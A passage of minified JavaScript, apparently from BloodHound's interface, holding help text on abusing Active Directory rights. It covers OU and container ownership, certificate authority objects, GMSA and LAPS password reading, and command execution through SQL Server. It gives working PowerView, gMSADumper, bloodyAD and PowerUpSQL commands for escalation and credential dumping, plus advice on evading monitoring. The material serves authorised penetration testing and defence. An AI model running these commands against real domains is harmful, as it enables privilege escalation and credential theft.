Unit"}),e.jsx(t,{variant:"body2",children:"With ownership of the OU object, you may grant yourself the GenericAll permission. This can be accomplished using the Add-DomainObjectAcl function in PowerView."}),e.jsxs(t,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ",a==="User"?`${r} if you are not running a process as that user`:`a member of ${r} if you are not running a process as a member`,". To do this in conjunction with Add-DomainObjectACL, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),e.jsx(t,{component:"pre",children:`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`}),e.jsx(t,{variant:"body2",children:"Then use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as a member of (the group that holds this ACE):"}),e.jsx(t,{component:"pre",children:`Add-DomainObjectAcl -Credential $Cred -TargetIdentity ${s} -Rights All`}),e.jsx(t,{variant:"body2",children:"With full control of the OU, you may now add a new ACE on the OU that will inherit down to the objects under that OU. Below are two options depending on how targeted you choose to be in this step:"}),e.jsx(t,{variant:"body1",children:"Generic Descendent Object Takeover"}),e.jsx(t,{variant:"body2",children:"The simplest and most straight forward way to abuse control of the OU is to apply a GenericAll ACE on the OU that will inherit down to all object types. Again, this can be done using PowerView. This time we will use the New-ADObjectAccessControlEntry, which gives us more control over the ACE we add to the OU."}),e.jsxs(t,{variant:"body2",children:["First, we need to reference the OU by its ObjectGUID, not its name. The ObjectGUID for the OU"," ",o," is: ",s,"."]}),e.jsx(t,{variant:"body2",children:"Next, we will fetch the GUID for all objects. This should be '00000000-0000-0000-0000-000000000000':"}),e.jsx(t,{component:"pre",children:`$Guids = Get-DomainGUIDMap
$AllObjectsPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'All'} | select -ExpandProperty name`}),e.jsx(t,{variant:"body2",children:'Then we will construct our ACE. This command will create an ACE granting the "JKHOLER" user full control of all descendant objects:'}),e.jsx(t,{component:"pre",children:"$ACE = New-ADObjectAccessControlEntry -Verbose -PrincipalIdentity 'JKOHLER' -Right GenericAll -AccessControlType Allow -InheritanceType All -InheritedObjectType $AllObjectsPropertyGuid"}),e.jsx(t,{variant:"body2",children:"Finally, we will apply this ACE to our target OU:"}),e.jsx(t,{component:"pre",children:`$OU = Get-DomainOU -Raw (OU GUID)
$DsEntry = $OU.GetDirectoryEntry()
$dsEntry.PsBase.Options.SecurityMasks = 'Dacl'
$dsEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)
$dsEntry.PsBase.CommitChanges()`}),e.jsx(t,{variant:"body2",children:'Now, the "JKOHLER" user will have full control of all descendent objects of each type.'}),e.jsx(t,{variant:"body1",children:"Targeted Descendent Object Takeoever"}),e.jsx(t,{variant:"body2",children:`If you want to be more targeted with your approach, it is possible to specify precisely what right you want to apply to precisely which kinds of descendent objects. You could, for example, grant a user "ForceChangePassword" permission against all user objects, or grant a security group the ability to read every GMSA password under a certain OU. Below is an example taken from PowerView's help text on how to grant the "ITADMIN" user the ability to read the LAPS password from all computer objects in the "Workstations" OU:`}),e.jsx(t,{component:"pre",children:`$Guids = Get-DomainGUIDMap
$AdmPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'ms-Mcs-AdmPwd'} | select -ExpandProperty name
$CompPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'Computer'} | select -ExpandProperty name
$ACE = New-ADObjectAccessControlEntry -Verbose -PrincipalIdentity itadmin -Right ExtendedRight,ReadProperty -AccessControlType Allow -ObjectType $AdmPropertyGuid -InheritanceType All -InheritedObjectType $CompPropertyGuid
$OU = Get-DomainOU -Raw Workstations
$DsEntry = $OU.GetDirectoryEntry()
$dsEntry.PsBase.Options.SecurityMasks = 'Dacl'
$dsEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)
$dsEntry.PsBase.CommitChanges()`}),e.jsx(t,{variant:"body1",children:"Objects for which ACL inheritance is disabled"}),e.jsx(t,{variant:"body2",children:"It is important to note that the compromise vector described above relies on ACL inheritance and will not work for objects with ACL inheritance disabled, such as objects protected by AdminSDHolder (attribute adminCount=1). This observation applies to any OU child user or computer with ACL inheritance disabled, including objects located in nested sub-OUs."}),e.jsx(t,{variant:"body2",children:"In such a situation, it may still be possible to exploit GenericAll permissions on an OU through an alternative attack vector. Indeed, with GenericAll permissions over an OU, you may make modifications to the gPLink attribute of the OU. The ability to alter the gPLink attribute of an OU may allow an attacker to apply a malicious Group Policy Object (GPO) to all of the OU's child user and computer objects (including the ones located in nested sub-OUs). This can be exploited to make said child objects execute arbitrary commands through an immediate scheduled task, thus compromising them."}),e.jsx(t,{variant:"body2",children:"Successful exploitation will require the possibility to add non-existing DNS records to the domain and to create machine accounts. Alternatively, an already compromised domain-joined machine may be used to perform the attack. Note that the attack vector implementation is not trivial and will require some setup."}),e.jsxs(t,{variant:"body2",children:["From a domain-joined compromised Windows machine, the gPLink manipulation attack vector may be exploited through Powermad, PowerView and native Windows functionalities. For a detailed outline of exploit requirements and implementation, you can refer to"," ",e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://labs.withsecure.com/publications/ou-having-a-laugh",children:"this article"}),"."]}),e.jsx(t,{variant:"body2",children:"Be mindful of the number of users and computers that are in the given OU as they all will attempt to fetch and apply the malicious GPO."}),e.jsx(t,{variant:"body2",children:"Alternatively, the ability to modify the gPLink attribute of an OU can be exploited in conjunction with write permissions on a GPO. In such a situation, an attacker could first inject a malicious scheduled task in the controlled GPO, and then link the GPO to the target OU through its gPLink attribute, making all child users and computers apply the malicious GPO and execute arbitrary commands."})]});case"Container":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"With ownership of the container object, you may grant yourself the GenericAll permission inherited to child objects."}),e.jsx(t,{variant:"body2",children:"This can be done with PowerShell:"}),e.jsx(w,{children:`$containerDN = "CN=USERS,DC=DUMPSTER,DC=FIRE"
                            $principalName = "principal"     # SAM account name of principal
                            
                            # Find the certificate template
                            $template = [ADSI]"LDAP://$containerDN"
                            
                            # Construct the ACE
                            $account = New-Object System.Security.Principal.NTAccount($principalName)
                            $sid = $account.Translate([System.Security.Principal.SecurityIdentifier])
                            $ace = New-Object DirectoryServices.ActiveDirectoryAccessRule(
                                $sid,
                                [System.DirectoryServices.ActiveDirectoryRights]::GenericAll,
                                [System.Security.AccessControl.AccessControlType]::Allow,
                                [System.DirectoryServices.ActiveDirectorySecurityInheritance]::Descendents
                            )
                            # Add the new ACE to the ACL
                            $acl = $template.psbase.ObjectSecurity
                            $acl.AddAccessRule($ace)
                            $template.psbase.CommitChanges()`})]});case"CertTemplate":return e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"With ownership over a certificate template, you can grant yourself GenericAll. With GenericAll, you may be able to perform an ESC4 attack by modifying the template's attributes. BloodHound will in that case create an ADCSESC4 edge from the principal to the forest domain node."})});case"EnterpriseCA":return e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"With ownership over an enterprise CA, you can grant yourself GenericAll. With GenericAll, you can publish certificate templates to the enterprise CA by adding the CN name of the template in the enterprise CA object's certificateTemplates attribute. This action may enable you to perform an ADCS domain escalation."})});case"RootCA":return e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"With ownership over a root CA, you can grant yourself GenericAll. With GenericAll, you can make a rogue certificate trusted as a root CA in the AD forest by adding the certificate in the root CA object's cACertificate attribute. This action may enable you to perform an ADCS domain escalation."})});case"NTAuthStore":return e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"With ownership over a NTAuth store, you can grant yourself GenericAll. With GenericAll, you can make an enterprise CA certificate trusted for NT (domain) authentication in the AD forest by adding the certificate in the root CA object's cACertificate attribute. This action may enable you to perform an ADCS domain escalation. This action may enable you to perform an ADCS domain escalation."})});case"IssuancePolicy":return e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"With ownership over an issuance policy object, you can grant yourself GenericAll. With GenericAll, you create a OID group link to a targeted group by adding the groups distinguishedName in the msDS-OIDToGroupLink attribute of the issuance policy object. This action may enable you to gain membership of the group through an ADCS ESC13 attack."})});default:return e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"No abuse information available for this node type."})})}},bm={general:dm,windowsAbuse:mm,linuxAbuse:hm,opsec:pm,references:um},fm=()=>e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:`When specific privileges on an object's DACL are explicitly granted to the "OWNER RIGHTS" SID (S-1-3-4), implicit owner rights (e.g., WriteDacl) are blocked, and the owner is granted only the specific privileges granted to OWNER RIGHTS. This can be used to limit the rights of the owner of an object.`})}),ym=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"To abuse ownership of an object where the OWNER RIGHTS SID is explicitly granted permissions, you can abuse the specific permissions granted to the OWNER RIGHTS SID."}),e.jsxs(t,{variant:"body2",children:["Please refer to the abuse info for the specific granted permissions at"," ",e.jsx("a",{target:"_blank",rel:"noopener noreferrer",href:"https://bloodhound.specterops.io/home/articles/17224136169371-About-BloodHound-Edges",children:"https://bloodhound.specterops.io/home/articles/17224136169371-About-BloodHound-Edges"})]})]}),gm=()=>e.jsx(e.Fragment,{children:e.jsxs(t,{variant:"body2",children:["Please refer to the OPSEC info for the specific granted permissions at"," ",e.jsx("a",{target:"_blank",rel:"noopener noreferrer",href:"https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html",children:"https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html"})]})}),xm=()=>e.jsxs(l,{sx:{overflowX:"auto"},children:[e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.hub.trimarcsecurity.com/post/trimarc-whitepaper-owner-or-pwnd",children:"https://www.hub.trimarcsecurity.com/post/trimarc-whitepaper-owner-or-pwnd"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/JimSycurity/OwnerOrPwned",children:"https://github.com/JimSycurity/OwnerOrPwned"})]}),jm=()=>e.jsx(e.Fragment,{children:e.jsxs(t,{variant:"body2",children:["To abuse ownership of an object where the OWNER RIGHTS SID is explicitly granted privileges, you can abuse the specific privileges granted to the OWNER RIGHTS SID.",e.jsx("br",{}),e.jsx("br",{}),"Please refer to the abuse info for the specific privileges granted to OWNER RIGHTS at"," ",e.jsx("a",{target:"_blank",rel:"noopener noreferrer",href:"https://bloodhound.specterops.io/home/articles/17224136169371-About-BloodHound-Edges",children:"https://bloodhound.specterops.io/home/articles/17224136169371-About-BloodHound-Edges"})]})}),wm={general:fm,windowsAbuse:jm,linuxAbuse:ym,opsec:gm,references:xm},vm=()=>e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"This edge is established from the principal that owns an object to the owned object. This edge is processed further to determine whether implicit owner rights (e.g., WriteDacl) are blocked, which may prevent the owner from compromising the destination object."})}),Am=()=>e.jsx(l,{sx:{overflowX:"auto"},children:e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://adminsdholder.com/2025/02/21/UpdatedOwnerOrPwned.html",children:"https://adminsdholder.com/2025/02/21/UpdatedOwnerOrPwned.html"})}),Sm={general:vm,references:Am},Cm=({sourceName:r,sourceType:a,targetName:o})=>e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:["The ",N(a)," ",r," is published to ",o,"."]}),e.jsx(t,{variant:"body2",children:"The certificate template is published to an enterprise certification authority. This relationship means the certificate template can be used when submitting an enrollment request to the specified certification authority."})]}),km=()=>e.jsx(t,{variant:"body2",children:"An attacker may perform several attacks that rely on a template being published to a certification authority. This relationship alone is not enough to escalate rights or impersonate other principals. This relationship may contribute to other relationships and attributes, from which an escalation opportunity may emerge."}),Tm=()=>e.jsx(t,{variant:"body2",children:"When an attacker abuses an escalation or impersonation primitive that relies on a template being published to a certification authority, a copy of the issued certificate will be saved on the host that issued the certificate."}),Pm=()=>e.jsx(l,{sx:{overflowX:"auto"},children:e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf",children:"https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf"})}),Dm=()=>e.jsx(t,{variant:"body2",children:"An attacker may perform several attacks that rely on a template being published to a certification authority. This relationship alone is not enough to escalate rights or impersonate other principals. This relationship may contribute to other relationships and attributes, from which an escalation opportunity may emerge."}),Om={general:Cm,windowsAbuse:Dm,linuxAbuse:km,opsec:Tm,references:Pm},Rm=({sourceName:r,sourceType:a,targetName:o})=>e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:[o," is a Group Managed Service Account. The ",N(a)," ",r," can retrieve the password for the GMSA ",o,"."]}),e.jsx(t,{variant:"body2",children:"Group Managed Service Accounts are a special type of Active Directory object, where the password for that object is mananaged by and automatically changed by Domain Controllers on a set interval (check the MSDS-ManagedPasswordInterval attribute)."}),e.jsx(t,{variant:"body2",children:"The intended use of a GMSA is to allow certain computer accounts to retrieve the password for the GMSA, then run local services as the GMSA. An attacker with control of an authorized principal may abuse that privilege to impersonate the GMSA."})]}),Em=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"There are several ways to abuse the ability to read the GMSA password. The most straight forward abuse is possible when the GMSA is currently logged on to a computer, which is the intended behavior for a GMSA. If the GMSA is logged on to the computer account which is granted the ability to retrieve the GMSA's password, simply steal the token from the process running as the GMSA, or inject into that process."}),e.jsx(t,{variant:"body2",children:'If the GMSA is not logged onto the computer, you may create a scheduled task or service set to run as the GMSA. The computer account will start the sheduled task or service as the GMSA, and then you may abuse the GMSA logon in the same fashion you would a standard user running processes on the machine (see the "HasSession" help modal for more details).'}),e.jsxs(t,{variant:"body2",children:["Finally, it is possible to remotely retrieve the password for the GMSA and convert that password to its equivalent NT hash.",e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/micahvandeusen/gMSADumper",children:"gMSADumper.py"})," ","can be used for that purpose."]}),e.jsx(t,{component:"pre",children:"gMSADumper.py -u 'user' -p 'password' -d 'domain.local'"}),e.jsx(t,{variant:"body2",children:"At this point you are ready to use the NT hash the same way you would with a regular user account. You can perform pass-the-hash, overpass-the-hash, or any other technique that takes an NT hash as an input."})]}),Im=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:`When abusing a GMSA that is already logged onto a system, you will have the same opsec considerations as when abusing a standard user logon. For more information about that, see the "HasSession" modal's opsec considerations tab.`}),e.jsx(t,{variant:"body2",children:"When retrieving the GMSA password from Active Directory, you may generate a 4662 event on the Domain Controller; however, that event will likely perfectly resemble a legitimate event if you request the password from the same context as a computer account that is already authorized to read the GMSA password."})]}),$m=()=>e.jsxs(l,{sx:{overflowX:"auto"},children:[e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.dsinternals.com/en/retrieving-cleartext-gmsa-passwords-from-active-directory/",children:"https://www.dsinternals.com/en/retrieving-cleartext-gmsa-passwords-from-active-directory/"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.powershellgallery.com/packages/DSInternals/",children:"https://www.powershellgallery.com/packages/DSInternals/"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/markgamache/gMSA/tree/master/PSgMSAPwd",children:"https://github.com/markgamache/gMSA/tree/master/PSgMSAPwd"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://adsecurity.org/?p=36",children:"https://adsecurity.org/?p=36"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://adsecurity.org/?p=2535",children:"https://adsecurity.org/?p=2535"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4662",children:"https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4662"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.thehacker.recipes/ad/movement/dacl/readgmsapassword",children:"https://www.thehacker.recipes/ad/movement/dacl/readgmsapassword"})]}),Gm=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"There are several ways to abuse the ability to read the GMSA password. The most straight forward abuse is possible when the GMSA is currently logged on to a computer, which is the intended behavior for a GMSA. If the GMSA is logged on to the computer account which is granted the ability to retrieve the GMSA's password, simply steal the token from the process running as the GMSA, or inject into that process."}),e.jsx(t,{variant:"body2",children:'If the GMSA is not logged onto the computer, you may create a scheduled task or service set to run as the GMSA. The computer account will start the sheduled task or service as the GMSA, and then you may abuse the GMSA logon in the same fashion you would a standard user running processes on the machine (see the "HasSession" help modal for more details).'}),e.jsx(t,{variant:"body2",children:"Finally, it is possible to remotely retrieve the password for the GMSA and convert that password to its equivalent NT hash, then perform overpass-the-hash to retrieve a Kerberos ticket for the GMSA:"}),e.jsxs(B,{children:[e.jsx(P,{children:e.jsxs(M,{children:["Build GMSAPasswordReader.exe from its source:"," ",e.jsx("a",{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/rvazarkar/GMSAPasswordReader",children:"https://github.com/rvazarkar/GMSAPasswordReader"})]})}),e.jsx(P,{children:e.jsx(M,{children:"Drop GMSAPasswordReader.exe to disk. If using Cobalt Strike, load and run this binary using execute-assembly"})}),e.jsx(P,{children:e.jsx(M,{children:'Use GMSAPasswordReader.exe to retrieve the NT hash for the GMSA. You may have more than one NT hash come back, one for the "old" password and one for the "current" password. It is possible that either value is valid:'})})]}),e.jsx(t,{component:"pre",children:"gmsapasswordreader.exe --accountname gmsa-jkohler"}),e.jsx(t,{variant:"body2",children:"At this point you are ready to use the NT hash the same way you would with a regular user account. You can perform pass-the-hash, overpass-the-hash, or any other technique that takes an NT hash as an input."})]}),Nm={general:Rm,windowsAbuse:Gm,linuxAbuse:Em,opsec:Im,references:$m},Mm=({sourceName:r,sourceType:a,targetName:o})=>e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:[E(a,r)," the ability to read the password set by Local Administrator Password Solution (LAPS) on the computer ",o,"."]}),e.jsxs(t,{variant:"body2",children:["For systems using legacy LAPS, the following AD computer object properties are relevant:",e.jsx("br",{}),e.jsx("b",{children:"- ms-Mcs-AdmPwd"}),": The plaintext LAPS password",e.jsx("br",{}),e.jsx("b",{children:"- ms-Mcs-AdmPwdExpirationTime"}),": The LAPS password expiration time",e.jsx("br",{})]}),e.jsxs(t,{variant:"body2",children:["For systems using Windows LAPS (2023 edition), the following AD computer object properties are relevant:",e.jsx("br",{}),e.jsx("b",{children:"- msLAPS-Password"}),": The plaintext LAPS password",e.jsx("br",{}),e.jsx("b",{children:"- msLAPS-PasswordExpirationTime"}),": The LAPS password expiration time",e.jsx("br",{}),e.jsx("b",{children:"- msLAPS-EncryptedPassword"}),": The encrypted LAPS password",e.jsx("br",{}),e.jsx("b",{children:"- msLAPS-EncryptedPasswordHistory"}),": The encrypted LAPS password history",e.jsx("br",{}),e.jsx("b",{children:"- msLAPS-EncryptedDSRMPassword"}),": The encrypted Directory Services Restore Mode (DSRM) password",e.jsx("br",{}),e.jsx("b",{children:"- msLAPS-EncryptedDSRMPasswordHistory"}),": The encrypted DSRM password history",e.jsx("br",{})]})]}),Lm=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"Read the LAPS password attributes listed in the General section."}),e.jsx(t,{variant:"body2",children:"Plaintext attributes can be read using a simple LDAP client. For example, with bloodyAD:"}),e.jsx(t,{component:"pre",children:"bloodyAD --host $DC_IP -d $DOMAIN -u $USER -p $PASSWORD get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime"}),e.jsx(t,{variant:"body2",children:"See Windows abuse for retrieving and decrypting the encrypted attributes."})]}),Fm=()=>e.jsx(t,{variant:"body2",children:"Reading properties from LDAP is an extremely low risk operation."}),_m=()=>e.jsxs(l,{sx:{overflowX:"auto"},children:[e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.specterops.io/assets/resources/an_ace_up_the_sleeve.pdf",children:"https://www.specterops.io/assets/resources/an_ace_up_the_sleeve.pdf"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://adsecurity.org/?p=3164",children:"https://adsecurity.org/?p=3164"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://learn.microsoft.com/en-us/powershell/module/laps/get-lapsadpassword",children:"https://learn.microsoft.com/en-us/powershell/module/laps/get-lapsadpassword"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/xpn/RandomTSScripts/tree/master/lapsv2decrypt",children:"https://github.com/xpn/RandomTSScripts/tree/master/lapsv2decrypt"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/CravateRouge/bloodyAD",children:"https://github.com/CravateRouge/bloodyAD"}),e.jsx("br",{})]}),Um=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"Read the LAPS password attributes listed in the General section."}),e.jsx(t,{variant:"body2",children:"Plaintext attributes can be read using a simple LDAP client. For example, with PowerView:"}),e.jsx(t,{component:"pre",children:'Get-DomainComputer "MachineName" -Properties "cn","ms-mcs-admpwd","ms-mcs-admpwdexpirationtime"'}),e.jsx(t,{variant:"body2",children:"Encrypted attributes can be decrypted using Microsoft's LAPS PowerShell module. For example:"}),e.jsx(t,{component:"pre",children:'Get-LapsADPassword "WIN10" -AsPlainText'}),e.jsxs(t,{variant:"body2",children:["The encrypted attributes can also be retrieved and decrypted using"," ",e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/xpn/RandomTSScripts/tree/master/lapsv2decrypt",children:"lapsv2decrypt"})," ","(dotnet or BOF)."]})]}),Wm={general:Mm,windowsAbuse:Um,linuxAbuse:Lm,opsec:Fm,references:_m},Bm=({sourceName:r,sourceType:a,targetName:o})=>e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:["The ",N(a)," ",r," is the root certification authority for ",o,"."]}),e.jsx(t,{variant:"body2",children:"The CA is trusted as a root certification authority by the domain. Any certificates signed by this CA will be trusted by the domain and all hosts in the domain."})]}),qm=()=>e.jsx(t,{variant:"body2",children:"An attacker may perform several attacks that rely on the existence of a root CA, such as ESC1. This edge alone is not enough to escalate rights or impersonate other principals. This edge may contribute to other edges and attributes, from which an escalation opportunity may emerge."}),Km=()=>e.jsx(t,{variant:"body2",children:"When an attacker abuses a privilege escalation or impersonation primitive that relies on this relationship, it will necessarily result in the issuance of a certificate. A copy of the issued certificate will be saved on the host that issued the certificate."}),zm=()=>e.jsxs(l,{sx:{overflowX:"auto"},children:[e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf",children:"Certified Pre-Owned ADCS Whitepaper"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.pkisolutions.com/understanding-active-directory-certificate-services-containers-in-active-directory/",children:"Understanding Active Directory Certificate Services Containers in Active Directory"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.ravenswoodtechnology.com/components-of-a-pki-part-2/",children:"Components of a PKI, Part 2: Certificate Authorities and CA Hierarchies"})]}),Hm=()=>e.jsx(t,{variant:"body2",children:"An attacker may perform several attacks that rely on the existence of a root CA, such as ESC1. This edge alone is not enough to escalate rights or impersonate other principals. This edge may contribute to other edges and attributes, from which an escalation opportunity may emerge."}),Vm={general:Bm,windowsAbuse:Hm,linuxAbuse:qm,opsec:Km,references:zm},Ym=()=>e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:["Scott Sutherland (",e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://twitter.com/_nullbind",children:"@nullbind"}),") from NetSPI has authored PowerUpSQL, a PowerShell Toolkit for Attacking SQL Server. Major contributors include Antti Rantasaari, Eric Gruber (",e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://twitter.com/egru",children:"@egru"}),"), and Thomas Elling (",e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/thomaselling",children:"@thomaselling"}),"). Before executing any of the below commands, download PowerUpSQL and load it into your PowerShell instance. Get PowerUpSQL here:"," ",e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/NetSPI/PowerUpSQL",children:"https://github.com/NetSPI/PowerUpSQL"}),"."]}),e.jsx(t,{variant:"body1",children:"Finding Data"}),e.jsx(t,{variant:"body2",children:"Get a list of databases, sizes, and encryption status:"}),e.jsx(t,{component:"pre",children:"Get-SQLDatabaseThreaded –Verbose -Instance sqlserver\\instance –Threads 10 -NoDefaults"}),e.jsx(t,{variant:"body2",children:"Search columns and data for keywords:"}),e.jsx(t,{component:"pre",children:'Get-SQLColumnSampleDataThreaded –Verbose -Instance sqlserver\\instance –Threads 10 –Keyword "card, password" –SampleSize 2 –ValidateCC -NoDefaults | ft -AutoSize'}),e.jsx(t,{variant:"body1",children:"Executing Commands"}),e.jsx(t,{variant:"body2",children:"Below are examples of PowerUpSQL functions that can be used to execute operating system commands on remote systems through SQL Server using different techniques. The level of access on the operating system will depend largely what privileges are provided to the service account. However, when domain accounts are configured to run SQL Server services, it is very common to see them configured with local administrator privileges."}),e.jsx(t,{variant:"body2",children:"xp_cmdshell Execute Example:"}),e.jsx(t,{component:"pre",children:'Invoke-SQLOSCmd -Verbose -Command "Whoami" -Threads 10 -Instance sqlserver\\instance'}),e.jsx(t,{variant:"body2",children:"Agent Job Execution Examples:"}),e.jsx(t,{component:"pre",children:'Invoke-SQLOSCmdAgentJob -Verbose -SubSystem CmdExec -Command "echo hello > c:\\windows\\temp\\test1.txt" -Instance sqlserver\\instance -username myuser -password mypassword'}),e.jsx(t,{component:"pre",children:`Invoke-SQLOSCmdAgentJob -Verbose -SubSystem PowerShell -Command 'write-output "hello world" | out-file c:\\windows\\temp\\test2.txt' -Sleep 20 -Instance sqlserver\\instance -username myuser -password mypassword`}),e.jsx(t,{component:"pre",children:"Invoke-SQLOSCmdAgentJob -Verbose -SubSystem VBScript -Command 'c:\\windows\\system32\\cmd.exe /c echo hello > c:\\windows\\temp\\test3.txt' -Instance sqlserver\\instance -username myuser -password mypassword"}),e.jsx(t,{component:"pre",children:"Invoke-SQLOSCmdAgentJob -Verbose -SubSystem JScript -Command 'c:\\windows\\system32\\cmd.exe /c echo hello > c:\\windows\\temp\\test3.txt' -Instance sqlserver\\instance -username myuser -password mypassword"}),e.jsx(t,{variant:"body2",children:"Python Subsystem Execution:"}),e.jsx(t,{component:"pre",children:'Invoke-SQLOSPython -Verbose -Command "Whoami" -Instance sqlserver\\instance'}),e.jsx(t,{variant:"body2",children:"R subsystem Execution Example"}),e.jsx(t,{component:"pre",children:'Invoke-SQLOSR -Verbose -Command "Whoami" -Instance sqlserver\\instance'}),e.jsx(t,{variant:"body2",children:"OLE Execution Example"}),e.jsx(t,{component:"pre",children:'Invoke-SQLOSOle -Verbose -Command "Whoami" -Instance sqlserver\\instance'}),e.jsx(t,{variant:"body2",children:"CLR Execution Example"}),e.jsx(t,{component:"pre",children:'Invoke-SQLOSCLR -Verbose -Command "Whoami" -Instance sqlserver\\instance'}),e.jsx(t,{variant:"body2",children:"Custom Extended Procedure Execution Example:"}),e.jsx(t,{variant:"body2",children:"1. Create a custom extended stored procedure."}),e.jsx(t,{component:"pre",children:'Create-SQLFileXpDll -Verbose -OutFile c:\\temp\\test.dll -Command "echo test > c:\\temp\\test.txt" -ExportName xp_test'}),e.jsx(t,{variant:"body2",children:"2. Host the test.dll on a share readable by the SQL Server service account."}),e.jsx(t,{component:"pre",children:`Get-SQLQuery -Verbose -Query "sp_addextendedproc 'xp_test', '\\\\yourserver\\yourshare\\myxp.dll'" -Instance sqlserver\\instance`}),e.jsx(t,{variant:"body2",children:"3. Run extended stored procedure"}),e.jsx(t,{component:"pre",children:'Get-SQLQuery -Verbose -Query "xp_test" -Instance sqlserver\\instance'}),e.jsx(t,{variant:"body2",children:"4. Remove extended stored procedure."}),e.jsx(t,{component:"pre",children:`Get-SQLQuery -Verbose -Query "sp_dropextendedproc 'xp_test'" -Instance sqlserver\\instance`}),e.jsx(t,{variant:"body2",children:"Author: Scott Sutherland"})]}),Qm=({sourceName:r,targetName:a})=>e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:["The user ",r," is a SQL admin on the computer ",a,"."]}),e.jsxs(t,{variant:"body2",children:["There is at least one MSSQL instance running on ",a," where the user ",r," is the account configured to run the SQL Server instance. The typical configuration for MSSQL is to have the local Windows account or Active Directory domain account that is configured to run the SQL Server service (the primary database engine for SQL Server) have sysadmin privileges in the SQL Server application. As a result, the SQL Server service account can be used to log into the SQL Server instance remotely, read all of the databases (including those protected with transparent encryption), and run operating systems command through SQL Server (as the service account) using a variety of techniques."]}),e.jsx(t,{variant:"body2",children:'For Windows systems that have been joined to an Active Directory domain, the SQL Server instances and the associated service account can be identified by executing a LDAP query for a list of "MSSQLSvc" Service Principal Names (SPN) as a domain user. In short, when the Database Engine service starts, it attempts to register the SPN, and the SPN is then used to help facilitate Kerberos authentication.'}),e.jsx(t,{variant:"body2",children:"Author: Scott Sutherland"})]}),Jm=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"Prior to executing operating system commands through SQL Server, review the audit configuration and choose a command execution method that is not being monitored."}),e.jsx(t,{variant:"body2",children:"View 